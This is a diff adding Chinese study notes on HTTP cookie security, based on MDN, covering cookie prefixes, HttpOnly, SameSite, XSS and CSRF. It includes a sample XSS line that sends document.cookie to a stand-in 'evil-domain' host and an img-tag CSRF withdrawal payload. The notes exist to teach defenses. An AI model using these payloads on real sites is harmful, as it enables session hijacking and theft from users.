@@ -89,3 +89,64 @@ SameSite 有三种值：
 3. `Lax`。与 Strict 类似，但用户从外部站点导航至URL时（例如通过链接）除外。在新版本浏览器中，为`默认`选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到URL时才会发送。如 link 链接。
 
 ### Cookie 前缀
+
+cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。
+
+子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。`会话固定攻击`中可能会`滥用`此机制。（会话劫持）
+
+但是，作为深度防御措施，可以使用 cookie `前缀`来断言有关 cookie 的特定事实。有两个前缀可用：
+
+1. `__Host-`：如果 cookie 名称具有此前缀，则仅当它也用 Secure 属性标记，是从安全来源发送的，不包括 Domain 属性，并将 Path 属性设置为 / 时，它才在 Set-Cookie 标头中接受。这样，这些 cookie 可以被视为`domain-locked`。
+2. `__Secure-`：如果 cookie 名称具有此前缀，则仅当它也用 Secure 属性标记，是从安全来源发送的，它才在 Set-Cookie 标头中接受。该前缀限制要弱于 __Host- 前缀。
+
+带有这些前缀的 Cookie， 如果不符合其限制的会被浏览器拒绝。这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对`会话劫持`的防御措施。
+
+### Document.cookie
+
+JS 通过`Document.cookie`创建新的 Cookie，也可以访问非 HttpOnly 标记的 Cookie。
+
+```javascript
+document.cookie = "yummy_cookie=choco";
+document.cookie = "tasty_cookie=strawberry";
+console.log(document.cookie);
+// logs "yummy_cookie=choco; tasty_cookie=strawberry"
+```
+
+通过 JS 创建的 Cookie 不能包含`HttpOnly`标志。
+
+JS 可以通过`跨站脚本攻击（XSS）`的方式来窃取 Cookie。
+
+### 安全
+
+存在 Cookie 中的数据可以被`访问`，也可以被`修改`。切记不能通过 Cookie 存储、传输敏感信息。可以用`JSON Web Tokens`之类的替代身份验证/机密机制。
+
+缓解涉及 Cookie 的攻击的方法：
+
+1. 使用`HttpOnly`属性可`防止`通过 JavaScript 访问 cookie 值。
+2. 用于敏感信息（身份验证）的 Cookie 的生存期应较短，并且`SameSite`属性设置为`Strict`或`Lax`。这样确保不与`跨域`请求一起发送身份验证 cookie，这种请求不会向服务器进行身份验证。
+
+#### 会话劫持和 XSS
+
+Cookie 常用来标记用户或授权会话。如果 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行[XSS](https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting)攻击。
+
+```javascript
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+```
+
+`HttpOnly`类型的 Cookie 用于阻止 JS 对其访问，一定程度缓解此类攻击。
+
+#### 跨站请求伪造（CSRF）
+
+[CSRF](https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF)。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：
+
+```javascript
+<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+```
+
+当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：
+
+1. 对用户输入进行过滤来阻止`XSS`。
+2. 任何敏感操作都需要确认。
+3. 用于敏感信息的 Cookie 只能拥有较短的生命周期。
+
+> [MDN HTTP cookies](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)
